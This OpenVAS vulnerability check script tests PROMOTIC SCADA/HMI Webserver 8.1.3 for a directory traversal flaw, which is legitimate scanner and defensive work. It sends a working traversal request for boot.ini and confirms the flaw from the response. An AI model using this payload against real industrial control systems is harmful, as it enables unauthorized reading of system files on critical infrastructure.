###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_promotic_scada_hmi_server_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "PROMOTIC SCADA/HMI Server Version 8.1.3, Other versions may also be affected.";
tag_insight = "The flaw is due to improper validation of URI containing '..\..\'
  sequences, which allows attackers to read arbitrary files via directory
  traversal attacks.";
tag_solution = "No solution or patch is available as of 19th, October 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.promotic.eu/en/promotic/scada-pm.htm";
tag_summary = "The host is running PROMOTIC SCADA/HMI Webserver and is prone to
  directory traversal vulnerability.";

if(description)
{
  script_id(802041);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/76395");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46430");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/promotic_1-adv.txt");

  script_description(desc);
  script_summary("Determine if PROMOTIC SCADA/HMI Webserver is vulnerable to Directory Traversal Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item: "/webdir/default.htm", port:port);
res = http_send_recv(port:port, data:req);

## Confirm the application before trying exploit
if(">PROMOTIC WEB Server<" >< res && "Server: Pm" >< res)
{
  ## Construct attack request
  url = "/webdir/..\..\..\..\..\..\..\..\..\boot.ini";

  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]"))
  {
    security_warning(port:port);
    exit(0);
  }
}
